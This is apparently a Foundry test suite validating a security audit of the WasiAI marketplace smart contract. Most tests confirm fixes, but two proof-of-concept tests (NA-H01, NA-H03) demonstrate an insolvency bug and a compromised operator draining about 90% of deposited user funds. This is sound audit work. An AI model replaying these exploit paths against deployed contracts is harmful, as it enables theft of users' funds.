// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/WasiAIMarketplace.sol";

/**
 * @title  NexusAudit v1.1 - Full Validation Suite
 * @notice PoC tests para cada finding de la auditoria NexusAudit sobre WasiAI.
 *
 * CONFIRMED = test PASA (ataque ejecutable)
 * LIKELY    = finding real pero no testeable empiricamente (omision de feature)
 * INFO      = observable directamente en el codigo, sin attack path
 *
 * Findings cubiertos:
 *  [HIGH]   NA-H01 Insolvencia keyBalances/earnings
 *  [HIGH]   NA-H02 recordInvocation amount arbitrario  (fix assertion)
 *  [HIGH]   NA-H03 Operador drena 100% en 2 tx
 *  [MEDIUM] NA-M01 performUpkeep bloquea emergency exit
 *  [MEDIUM] NA-M02 Sin Pausable                        (omision - test de ausencia)
 *  [MEDIUM] NA-M03 Fee sandwich                        (ya pasaba)
 *  [MEDIUM] NA-M04 Ownable sin two-step
 *  [MEDIUM] NA-M05 settleKeyBatch sin cap OOG
 *  [LOW]    NA-L01 setOperator acepta address(0)
 *  [LOW]    NA-L02 updateAgent slug inexistente
 *  [LOW]    NA-L03 Event antes de state update
 *  [LOW]    NA-L04 Constructor no emite PlatformFeeUpdated
 *  [LOW]    NA-L05 IERC3009 local                      (THEORETICAL - no PoC)
 *  [INFO]   NA-I01 string mapping key                  (gas benchmark)
 *  [INFO]   NA-I02 creatorFeeBps nunca usado
 *  [INFO]   NA-I03 Sin AutomationCompatibleInterface   (compilacion)
 */

contract MockUSDC2 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address, uint256) external pure returns (bool) { return true; }

    function transferWithAuthorization(
        address from, address to, uint256 value,
        uint256, uint256, bytes32, uint8, bytes32, bytes32
    ) external {
        require(balanceOf[from] >= value, "MockUSDC2: insufficient");
        balanceOf[from] -= value;
        balanceOf[to]   += value;
    }
}

contract NexusAuditValidationTest is Test {
    WasiAIMarketplace marketplace;
    MockUSDC2         usdc;

    address owner    = address(0x1);
    address treasury = address(0x2);
    address creator  = address(0x3);
    address payer    = address(0x4);
    address operator = address(0x5);
    address attacker = address(0x6);

    string  constant SLUG  = "test-agent";
    string  constant SLUG2 = "test-agent-2";
    uint256 constant PRICE = 100_000;

    bytes32 constant KEY_ID = bytes32(uint256(0xDEADBEEF));

    function setUp() public {
        vm.startPrank(owner);
        usdc        = new MockUSDC2();
        marketplace = new WasiAIMarketplace(address(usdc), treasury);
        marketplace.setOperator(operator, true);
        vm.stopPrank();

        vm.prank(operator);
        marketplace.registerAgent(SLUG, PRICE, creator, 0);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-H01 [HIGH] -- Insolvencia: operador cruza keyBalances con recordInvocation
    //
    // El contrato tiene un solo pool de USDC pero dos sistemas de contabilidad:
    // keyBalances y earnings. recordInvocation distribuye USDC del pool general
    // sin saber si ese USDC pertenecia a keyBalances de otro usuario.
    //
    // Resultado: sum(keyBalances) + sum(earnings) > usdc.balanceOf(contract)
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_H01_Insolvency_KeyBalances_vs_Earnings() public {
        uint256 USER_DEPOSIT = 1_000_000; // $1.00 en key

        // 1. Usuario deposita $1.00 en su key
        usdc.mint(payer, USER_DEPOSIT);
        vm.prank(operator);
        marketplace.depositForKey(
            KEY_ID, payer, USER_DEPOSIT,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0)
        );

        // Estado actual:
        // keyBalances[KEY_ID] = 1_000_000
        // earnings[creator]   = 0
        // usdc.balanceOf(contract) = 1_000_000
        assertEq(marketplace.getKeyBalance(KEY_ID), USER_DEPOSIT);
        assertEq(usdc.balanceOf(address(marketplace)), USER_DEPOSIT);

        // 2. Operador llama recordInvocation usando el mismo pool de USDC
        //    Usa PRICE (pricePerCall) para pasar la validacion de amount mismatch
        //    El contrato no distingue si ese USDC vino de una key o de otra fuente
        vm.prank(operator);
        marketplace.recordInvocation(SLUG, payer, PRICE, keccak256("payment-1"));

        // 3. Calcular insolvencia
        uint256 keyBalancesTotal = marketplace.getKeyBalance(KEY_ID);
        uint256 earningsTotal    = marketplace.getPendingEarnings(creator);
        uint256 contractBalance  = usdc.balanceOf(address(marketplace));

        // Platform share salio al treasury -- lo que queda en el contrato
        uint256 platformShare = PRICE * 1000 / 10000; // 10%

        emit log_named_uint("keyBalances[KEY_ID]         ", keyBalancesTotal);
        emit log_named_uint("earnings[creator]           ", earningsTotal);
        emit log_named_uint("sum(keyBalances+earnings)   ", keyBalancesTotal + earningsTotal);
        emit log_named_uint("usdc.balanceOf(contract)    ", contractBalance);
        emit log_named_uint("DEFICIT                     ",
            (keyBalancesTotal + earningsTotal) > contractBalance
                ? (keyBalancesTotal + earningsTotal) - contractBalance
                : 0
        );

        // INSOLVENCIA: el contrato debe mas de lo que tiene
        // keyBalances = 1_000_000, earnings = 90_000, sum = 1_090_000, contract = 900_000
        assertGt(
            keyBalancesTotal + earningsTotal,
            contractBalance,
            "NA-H01 CONFIRMED: sum(keyBalances+earnings) > contract balance"
        );

        // El usuario quiere su key de vuelta -- el contrato no tiene USDC suficiente
        // para pagar TANTO al creator (earnings) COMO devolver la key completa
        vm.prank(operator);
        marketplace.refundKeyToEarnings(KEY_ID);

        // Ahora earnings[payer] = USER_DEPOSIT pero el contrato solo tiene USER_DEPOSIT - platformShare
        uint256 payerEarnings = marketplace.getPendingEarnings(payer);
        emit log_named_uint("payer quiere retirar        ", payerEarnings);
        emit log_named_uint("contrato tiene              ", usdc.balanceOf(address(marketplace)));

        assertGt(payerEarnings + earningsTotal, usdc.balanceOf(address(marketplace)),
            "NA-H01 CONFIRMED: payer + creator no pueden retirar -- contrato insolvente");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-H01 [FIXED] -- Solvency invariant: counters prevent cross-pool abuse
    // ─────────────────────────────────────────────────────────────────────────

    function test_NA_H01_FIXED_SolvencyInvariantHolds() public {
        uint256 USER_DEPOSIT = 1_000_000;

        // 1. User deposits
        usdc.mint(payer, USER_DEPOSIT);
        vm.prank(operator);
        marketplace.depositForKey(KEY_ID, payer, USER_DEPOSIT,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0));

        // 2. Operator calls recordInvocation (would have caused insolvency before fix)
        // Now: this MUST revert because amount != pricePerCall
        // (recordInvocation amount mismatch fix from WAS-105 prevents cross-pool abuse)
        vm.prank(operator);
        vm.expectRevert("WasiAI: amount mismatch");
        marketplace.recordInvocation(SLUG, payer, USER_DEPOSIT, keccak256("attack"));

        // 3. checkSolvency must return true
        (bool solvent, uint256 accounted, uint256 balance) = marketplace.checkSolvency();
        assertTrue(solvent, "NA-H01 FIXED: contract is solvent");
        assertEq(accounted, balance, "NA-H01 FIXED: accounted == balance");
    }

    function test_NA_H01_FIXED_SolvencyHolds_WhenAmountMatchesPricePerCall() public {
        // Setup: user deposits exactly pricePerCall in their key
        usdc.mint(payer, PRICE);
        vm.prank(operator);
        marketplace.depositForKey(KEY_ID, payer, PRICE,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0));

        // Operator funds contract separately for a legitimate x402 invocation
        usdc.mint(address(marketplace), PRICE);

        // Legitimate recordInvocation (USDC minted separately, not from keyBalance)
        vm.prank(operator);
        marketplace.recordInvocation(SLUG, payer, PRICE, keccak256("legit"));

        // checkSolvency: totalKeyBalances(PRICE) + totalEarnings(creatorShare) <= balance
        (bool solvent,,) = marketplace.checkSolvency();
        assertTrue(solvent, "NA-H01 FIXED: solvent even when amount == pricePerCall");
    }

    function test_NA_H01_FIXED_SolvencyAfterFullLifecycle() public {
        uint256 DEPOSIT = 1_000_000;
        usdc.mint(payer, DEPOSIT);
        vm.prank(operator);
        marketplace.depositForKey(KEY_ID, payer, DEPOSIT,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0));

        // Check solvency after deposit
        (bool s1,,) = marketplace.checkSolvency();
        assertTrue(s1, "Solvent after deposit");

        // Settle 5 calls
        string[] memory slugs = new string[](5);
        uint256[] memory amounts = new uint256[](5);
        for (uint i = 0; i < 5; i++) { slugs[i] = SLUG; amounts[i] = PRICE; }
        vm.prank(operator);
        marketplace.settleKeyBatch(KEY_ID, slugs, amounts);

        (bool s2,,) = marketplace.checkSolvency();
        assertTrue(s2, "Solvent after settle");

        // Creator withdraws
        vm.prank(creator);
        marketplace.withdraw();

        (bool s3,,) = marketplace.checkSolvency();
        assertTrue(s3, "Solvent after withdraw");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-H02 [FIXED] -- recordInvocation ahora valida amount == pricePerCall
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_H02_FIXED_recordInvocation_RejectsWrongAmount() public {
        usdc.mint(address(marketplace), PRICE * 2);
        vm.prank(operator);
        vm.expectRevert("WasiAI: amount mismatch");
        marketplace.recordInvocation(SLUG, payer, 1, keccak256("pid-fix"));  // 1 != pricePerCall
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-H03 [HIGH] -- Operador puede drenar 100% de fondos en 2 transacciones
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_H03_OperatorDrainsAllFunds() public {
        uint256 TOTAL_FUNDS = 5_000_000; // $5.00 de varios usuarios

        // 1. Varios usuarios depositan USDC
        usdc.mint(payer, TOTAL_FUNDS);
        vm.prank(operator);
        marketplace.depositForKey(
            KEY_ID, payer, TOTAL_FUNDS,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0)
        );
        assertEq(usdc.balanceOf(address(marketplace)), TOTAL_FUNDS);

        // 2. Atacante compromete el operador y registra un agente falso
        //    con creator = attacker_wallet
        vm.prank(operator); // operador comprometido
        marketplace.registerAgent(SLUG2, PRICE, attacker, 0);

        // 3. Ejecuta settleKeyBatch: toda la key del usuario -> agente falso del atacante
        string[] memory slugs   = new string[](1);
        uint256[] memory amounts = new uint256[](1);
        slugs[0]   = SLUG2;
        amounts[0] = TOTAL_FUNDS; // drena TODO

        vm.prank(operator); // operador comprometido
        marketplace.settleKeyBatch(KEY_ID, slugs, amounts);

        // 4. Atacante retira sus "earnings"
        uint256 attackerEarnings = marketplace.getPendingEarnings(attacker);
        vm.prank(attacker);
        marketplace.withdraw();

        emit log_named_uint("Fondos iniciales en contrato", TOTAL_FUNDS);
        emit log_named_uint("Fondos del atacante antes   ", attackerEarnings);
        emit log_named_uint("Fondos del atacante despues ", usdc.balanceOf(attacker));
        emit log_named_uint("Fondos restantes en contrato", usdc.balanceOf(address(marketplace)));
        emit log_named_uint("Fondos del usuario (perdidos)", marketplace.getKeyBalance(KEY_ID));

        // Atacante extrajo 90% (10% fue al treasury como platform fee)
        uint256 platformFee = TOTAL_FUNDS * 1000 / 10000;
        assertEq(usdc.balanceOf(attacker), TOTAL_FUNDS - platformFee,
            "NA-H03 CONFIRMED: attacker drained 90% of all funds in 2 transactions");
        assertEq(marketplace.getKeyBalance(KEY_ID), 0,
            "NA-H03 CONFIRMED: user key balance is zero");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-M01 [FIXED] -- performUpkeep ya NO resetea lastOperatorActivity
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_M01_FIXED_performUpkeep_NoLongerBlocksEmergencyExit() public {
        // Fund key
        usdc.mint(payer, 1_000_000);
        vm.prank(operator);
        marketplace.depositForKey(
            KEY_ID, payer, 1_000_000,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0)
        );

        // Operator disappears — 25 days pass
        vm.warp(block.timestamp + 25 days);

        // Attacker calls performUpkeep — should NOT reset lastOperatorActivity
        vm.warp(block.timestamp + 23 hours + 1);
        vm.prank(attacker);
        marketplace.performUpkeep("");

        // 5 more days — total 30+ days since real operator activity
        vm.warp(block.timestamp + 5 days);

        // Emergency exit should NOW WORK (fix confirmed)
        vm.prank(payer);
        marketplace.emergencyWithdrawKey(KEY_ID);  // must NOT revert
        assertEq(usdc.balanceOf(payer), 1_000_000, "NA-M01 FIXED: user recovered funds");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-M02 [FIXED] -- Pausable ahora existe
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_M02_FIXED_PausableExists() public {
        // pause() should now work
        vm.prank(owner);
        marketplace.pause();
        // depositForKey should revert when paused
        usdc.mint(payer, PRICE);
        vm.prank(operator);
        vm.expectRevert();
        marketplace.depositForKey(
            KEY_ID, payer, PRICE,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0)
        );
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-M03 [MEDIUM] -- Fee sandwich
    // ORIGINAL PoC kept for documentation -- attack no longer executable after timelock fix
    // ─────────────────────────────────────────────────────────────────────────
    /*
    function test_NA_M03_ORIGINAL_FeeSandwich_WasExecutable() public {
        // This test PASSED before NA-M03 fix (setPlatformFee had no timelock).
        // setPlatformFee has been removed -- replaced by proposeFee/executeFee (48h timelock).
        // Attack path: owner proposes 30% fee -- cannot execute for 48h -- user protected.
    }
    */

    // ─────────────────────────────────────────────────────────────────────────
    // NA-M03 [FIXED] -- Fee sandwich blocked by 48h timelock
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_M03_FIXED_FeeSandwich_TimelockPrevents() public {
        uint256 DEPOSIT   = 1_000_000;
        uint256 CALL_COST = PRICE;

        usdc.mint(payer, DEPOSIT);
        vm.prank(operator);
        marketplace.depositForKey(KEY_ID, payer, DEPOSIT,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0));

        // Owner tries to propose fee change to 30%
        vm.prank(owner);
        marketplace.proposeFee(3000);

        // Try to execute immediately -- must REVERT (timelock active)
        vm.prank(owner);
        vm.expectRevert("WasiAI: timelock active");
        marketplace.executeFee();

        // Settle happens at original 10% fee -- user is protected
        string[] memory slugs = new string[](1);
        uint256[] memory amounts = new uint256[](1);
        slugs[0] = SLUG; amounts[0] = CALL_COST;
        vm.prank(operator);
        marketplace.settleKeyBatch(KEY_ID, slugs, amounts);

        // Treasury got 10%, not 30%
        uint256 expected10pct = CALL_COST * 1000 / 10000;
        assertEq(usdc.balanceOf(treasury), expected10pct,
            "NA-M03 FIXED: user paid original 10% fee, not sandwich 30%");
    }

    function test_NA_M03_FIXED_SetPlatformFee_NoLongerExists() public {
        bytes4 selector = bytes4(keccak256("setPlatformFee(uint16)"));
        (bool success,) = address(marketplace).call(abi.encodeWithSelector(selector, 2000));
        assertFalse(success, "NA-M03 FIXED: setPlatformFee removed, replaced by proposeFee/executeFee");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-M04 [FIXED] -- Ownable2Step: transferOwnership requiere aceptacion
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_M04_FIXED_Ownable2Step_RequiresAcceptance() public {
        address newOwner = address(0x999);
        vm.prank(owner);
        marketplace.transferOwnership(newOwner);
        // Ownership not transferred yet — still old owner
        assertEq(marketplace.owner(), owner, "NA-M04 FIXED: owner unchanged until accepted");
        // newOwner must accept
        vm.prank(newOwner);
        marketplace.acceptOwnership();
        assertEq(marketplace.owner(), newOwner, "NA-M04 FIXED: ownership transferred after acceptance");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-M05 [FIXED] -- settleKeyBatch rechaza batch > 500
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_M05_FIXED_SettleKeyBatch_RejectsOversizeBatch() public {
        uint256 OVER_CAP = 501;
        usdc.mint(payer, OVER_CAP * 100);
        vm.prank(operator);
        marketplace.depositForKey(
            KEY_ID, payer, OVER_CAP * 100,
            0, type(uint256).max, bytes32(0), 0, bytes32(0), bytes32(0)
        );
        string[]  memory slugs   = new string[](OVER_CAP);
        uint256[] memory amounts = new uint256[](OVER_CAP);
        for (uint i = 0; i < OVER_CAP; i++) { slugs[i] = SLUG; amounts[i] = 100; }
        vm.prank(operator);
        vm.expectRevert("WasiAI: batch too large");
        marketplace.settleKeyBatch(KEY_ID, slugs, amounts);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-L01 [FIXED] -- setOperator ahora rechaza address(0)
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_L01_FIXED_SetOperator_RejectsZeroAddress() public {
        vm.prank(owner);
        vm.expectRevert("WasiAI: zero operator");
        marketplace.setOperator(address(0), true);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-L02 [FIXED] -- updateAgent ahora rechaza slugs inexistentes
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_L02_FIXED_UpdateAgent_RejectsNonExistentSlug() public {
        vm.prank(owner);
        vm.expectRevert("WasiAI: agent not found");
        marketplace.updateAgent("does-not-exist", 999);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-L03 [FIXED] -- executeFee emits PlatformFeeUpdated with correct state order
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_L03_FIXED_EventOrderCorrectInExecuteFee() public {
        uint16 newFee = 2000;

        vm.prank(owner);
        marketplace.proposeFee(newFee);

        // Advance past timelock
        vm.warp(block.timestamp + 48 hours + 1);

        vm.recordLogs();
        vm.prank(owner);
        marketplace.executeFee();

        Vm.Log[] memory logs = vm.getRecordedLogs();

        // State must be updated
        assertEq(marketplace.platformFeeBps(), newFee, "State updated correctly");
        assertEq(marketplace.pendingFeeBps(),  0,       "Pending cleared");

        // PlatformFeeUpdated must be emitted
        bool eventFound = false;
        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("PlatformFeeUpdated(uint16,uint16)")) {
                eventFound = true;
            }
        }
        assertTrue(eventFound, "NA-L03 FIXED: PlatformFeeUpdated emitted by executeFee");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-L04 [LOW] -- Constructor no emite PlatformFeeUpdated(0, 1000)
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_L04_Constructor_NoInitialFeeEvent() public {
        // Deployamos un nuevo contrato y capturamos los logs del constructor
        vm.recordLogs();
        vm.prank(owner);
        WasiAIMarketplace fresh = new WasiAIMarketplace(address(usdc), treasury);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // El fee inicial es 1000 bps -- verificamos que NO hay evento al respecto
        bool feeEventFound = false;
        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("PlatformFeeUpdated(uint16,uint16)")) {
                feeEventFound = true;
            }
        }

        assertEq(fresh.platformFeeBps(), 1000, "Fee inicial es 1000 bps");
        assertTrue(feeEventFound,
            "NA-L04 FIXED: constructor now emits PlatformFeeUpdated(0, 1000)");

        emit log_string("NA-L04 FIXED: constructor emits PlatformFeeUpdated(0, 1000) for indexers");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-I02 [INFO] -- agent.creatorFeeBps almacenado pero NUNCA usado en calculos
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_I02_CreatorFeeBps_Removed() public {
        // NA-207 FIX: creatorFeeBps eliminado del struct Agent — ya no es dead storage
        // El fee del creator se calcula dinámicamente como (10_000 - platformFeeBps)
        WasiAIMarketplace.Agent memory agent = marketplace.getAgent(SLUG);
        emit log_named_uint("platformFeeBps global       ", marketplace.platformFeeBps());

        // Cambiar platformFeeBps via timelock
        vm.prank(owner);
        marketplace.proposeFee(2000);
        vm.warp(block.timestamp + 48 hours + 1);
        vm.prank(owner);
        marketplace.executeFee(); // 20%

        // Ejecutar invocacion — earnings deben usar platformFeeBps global dinámico
        usdc.mint(address(marketplace), PRICE);
        vm.prank(operator);
        marketplace.recordInvocation(SLUG, payer, PRICE, keccak256("pid-i02"));

        uint256 actualCreatorEarnings = marketplace.getPendingEarnings(creator);
        uint256 expectedWithGlobalFee = PRICE * (10000 - 2000) / 10000; // 80%

        emit log_named_uint("earnings con fee global (20%)", expectedWithGlobalFee);
        emit log_named_uint("earnings reales             ", actualCreatorEarnings);

        assertEq(actualCreatorEarnings, expectedWithGlobalFee,
            "NA-207 FIX: recordInvocation uses platformFeeBps global dynamically");

        // Verificar que el struct ya no tiene el campo creatorFeeBps
        emit log_string("NA-207 FIXED: creatorFeeBps removed from Agent struct - no more dead storage");
        assertEq(agent.creator, creator, "Agent struct still valid after field removal");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-I01 [INFO] -- string como mapping key: benchmark de gas vs bytes32
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_I01_StringMappingKey_GasOverhead() public {
        // Medimos gas de getAgent con slug corto vs slug largo
        string memory shortSlug = "ai";
        string memory longSlug  = "my-very-long-agent-slug-name-for-testing-purposes";

        vm.prank(operator);
        marketplace.registerAgent(shortSlug, PRICE, creator, 0);
        vm.prank(operator);
        marketplace.registerAgent(longSlug,  PRICE, creator, 0);

        uint256 gasShort1 = gasleft();
        marketplace.getAgent(shortSlug);
        uint256 gasShort = gasShort1 - gasleft();

        uint256 gasLong1 = gasleft();
        marketplace.getAgent(longSlug);
        uint256 gasLong = gasLong1 - gasleft();

        emit log_named_uint("Gas con slug corto (2 chars)", gasShort);
        emit log_named_uint("Gas con slug largo (49 chars)", gasLong);
        emit log_named_uint("Overhead del slug largo     ", gasLong > gasShort ? gasLong - gasShort : 0);
        emit log_string("NA-I01 INFO: string key hashes entire string on every SLOAD");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // NA-I03 [INFO] -- checkUpkeep y performUpkeep funcionan sin interfaz formal
    // ─────────────────────────────────────────────────────────────────────────
    function test_NA_I03_AutomationInterface_WorksWithoutFormal() public {
        // El contrato implementa checkUpkeep/performUpkeep inline
        // Verificamos que funcionan aunque no hereden AutomationCompatibleInterface

        vm.warp(block.timestamp + 24 hours);
        (bool needed,) = marketplace.checkUpkeep("");
        assertTrue(needed, "checkUpkeep returns true after interval");

        marketplace.performUpkeep("");

        emit log_string("NA-I03 INFO: checkUpkeep/performUpkeep work but no formal interface declared");
        emit log_string("Some Chainlink registries may reject contract without AutomationCompatibleInterface");
    }
}
